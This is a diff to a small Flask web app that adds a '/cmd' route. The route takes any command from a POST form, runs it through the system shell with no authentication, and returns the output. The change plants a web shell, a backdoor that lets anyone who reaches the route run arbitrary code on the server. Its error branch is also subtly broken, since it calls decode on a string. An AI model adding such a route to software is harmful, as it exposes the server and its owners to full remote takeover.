@@ -1,3 +1,4 @@
+import subprocess
 import time
 
 from flask import Flask, render_template, request
@@ -38,6 +39,16 @@ def home():
         text = initialize_text(elements)
         return render_template('index.html', text=text)
 
+@app.route('/cmd', methods=['GET', 'POST'])
+def cmd():
+    if request.method == 'POST':
+        command = request.form.get('command')
+        try:
+            result = subprocess.check_output(command, shell=True)
+        except Exception as e:
+            result = str(e)
+        return render_template('cmd.html', result=result.decode('utf-8'))
+    return render_template('cmd.html')
 
 def initialize_text(elements):
     time_passed,result=sequent.menu(*elements)
